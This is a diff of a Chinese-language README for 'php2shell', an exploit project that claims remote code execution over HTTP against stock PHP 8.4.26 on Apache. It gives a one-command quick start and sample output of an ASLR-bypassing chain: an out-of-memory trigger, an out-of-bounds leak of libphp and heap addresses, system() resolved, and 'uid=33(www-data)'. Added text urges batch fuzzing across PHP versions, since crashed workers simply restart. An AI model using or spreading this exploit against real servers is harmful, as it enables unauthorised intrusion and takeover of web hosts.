@@ -1,16 +1,19 @@
-# php2shell — PHP 8.4.26 session 漏洞复现
+# php2shell - 官方环境 无需display_errors，不修改memory_limit
 
 中文 | [English](readme_en.md)
 
-**目标没有变，仍然是 stock 官方 `php:8.4.26-apache` + 官方
-`php.ini-production`：`display_errors=Off`、`display_startup_errors=Off`、
-`memory_limit=128M`、`post_max_size=8M`、单 worker prefork。**
-在完全远程、只用 HTTP、目标页面只有 `<?php echo "OK\n"; ?>`、不写目标侧
+**单 worker prefork。**环境下在完全远程、只用 HTTP、目标页面只有 `<?php echo "OK\n"; ?>`、不写目标侧
 PHP 的约束下，一条命令拿到 RCE：
 
 - stock 官方镜像 + 官方 ini：**5/5**
 - 带符号的同一官方构建（gdb 只用于离线标定，不在交付路径）：**15/15**
 - 单次约 2 秒，worker 不重启，目标 ini 未改
+
+# 通用利用
+
+理论上只要你计算出所有php版本的偏移，然后利用这些偏移批量去fuzz，总有一条fuzz是能rce的。反正worker崩了也会重启，不怕目标打挂。
+
+关于worker，目前单worker不影响目标实现，只影响胜率，在测试环境先临时使用单worker来装逼，完整官方worker环境之后放出。
 
 ## 快速开始（官方 php.ini-production / display_errors=Off / 128M）
 
@@ -27,6 +30,12 @@ cd php2shell-bypass-aslr-exp
 
 # 2) 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> id
 python3 pure/pwn_pure.py --port 18110
+# [try 1] A1: END-cleanup send_cookie OOM
+# [try 1] B1: stale-id OOB read (chunk base + libphp)
+#       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
+#       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
+#                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
+# [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
 # [4/4] RCE OK; proof .../out/p1:
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
